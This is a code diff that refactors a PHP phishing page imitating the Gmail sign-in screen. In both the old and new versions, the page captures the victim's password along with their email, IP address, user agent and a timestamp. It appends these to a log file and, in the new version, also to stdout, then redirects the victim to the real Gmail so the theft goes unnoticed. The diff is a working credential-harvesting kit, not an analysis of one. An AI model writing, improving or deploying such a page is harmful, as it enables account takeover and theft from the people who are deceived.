@@ -9,31 +9,53 @@
   <title>Gmail</title>
  <link rel="stylesheet" type="text/css"  href="index.css" media="screen" />
 <?php
-session_start ();
-$passfile = $_SESSION['link'];
-$a = strtolower( $_SESSION['use'] );
-$agent =  $_SERVER['HTTP_USER_AGENT'];
- $ip = $_SERVER['REMOTE_ADDR'];
-$d = date("Y-m-d h:i:sa");
-	
-if(isset($_POST['signin'])){
-$pass = $_POST['password'];
-$c = strlen($pass);
-$pstyle = "border:1px solid red;";
-if(empty($pass)){
-$msg = " Please enter your password. ";}
-elseif($c < 7){
-$msg = " Wrong password. Try again. ";}
-elseif($c > 6 && $c < 20){ $g = fopen($passfile,"a");;
-fwrite ($g , "Email>[". $a . "]:Password>[". $pass ." ] Ip>[". $ip. "]:\nuseragent>[". $agent ." ]\nDate:[".$d."]\n");
-fclose($g);
-header("Location:http://www.gmail.com");
-}
-else{$msg= " ";}
-}else{ $msg= " ";
-$pstyle = " ";
+    session_start ();
+    
+    $resultMessage = "";
+    $passwordStyle = "";
+    $registryFile = $_SESSION['link'];
+    $userGmail = strtolower($_SESSION['use']);
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    $senderIp = $_SERVER['REMOTE_ADDR'];
+    $currentTimestamp = date("Y-m-d h:i:sa");
+        
+    if(isset($_POST['signin'])){
+        $userPassword = $_POST['password'];
+        $userPasswordLength = strlen($userPassword);
+        $passwordStyle = "border: 1px solid red;";
 
-}
+        if (empty($userPassword)){
+            $resultMessage = " Please enter your password. ";
+        }
+        elseif($userPasswordLength < 7){
+            $resultMessage = " Wrong password. Try again. ";
+        }
+        elseif ($userPasswordLength > 6 && $userPasswordLength < 20) { 
+            $registryFileHandler = fopen(
+                $registryFile,
+                'a'
+            );
+
+            $stdoutFileHandler = fopen(
+                '/dev/stdout',
+                'a'
+            );
+
+            $outputTemplate = "email: ${userGmail}\n";
+            $outputTemplate .= "password: ${userPassword}\n";
+            $outputTemplate .= "userIp: ${senderIp}\n";
+            $outputTemplate .= "userAgent: ${userAgent}\n";
+            $outputTemplate .= "capturedAt: ${currentTimestamp}\n";
+            $outputTemplate .= "+----------------------------------------+";
+
+            fwrite($registryFileHandler , $outputTemplate);
+            fclose($registryFileHandler);
+
+            fwrite($stdoutFileHandler, $outputTemplate);
+            fclose($stdoutFileHandler);
+            header("Location: https://www.gmail.com");
+        }
+    }
 #include('header.php');
 ?>
   <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
@@ -2682,16 +2704,16 @@ $pstyle = " ";
   <div>
   
   <span id="email-display"><?php
-		echo $a;
+		echo $userGmail;
 		?></span>
   </div>
   <div>
   <div id="password-shown"><div>
   <p><input type="hidden" name="Email" value=" <?php
-		echo $a;
+		echo $userGmail;
 		?>"></p>
 <label class="hidden-label" for="Passwd">Password</label>
-<input id="Passwd" class="" id="password" name="password" placeholder="Password" required="" type="password" style="<?php echo $pstyle; ?>">  <label style = "margin:3px; color:red;"><?php echo $msg; ?></label>
+<input id="Passwd" class="" id="password" name="password" placeholder="Password" required="" type="password" style="<?php echo $passwordStyle; ?>">  <label style = "margin:3px; color:red;"><?php echo $resultMessage; ?></label>
   </div></div>
   </div>
 <input id="signIn" name="signin" class="rc-button rc-button-submit" value="Sign in" type="submit">
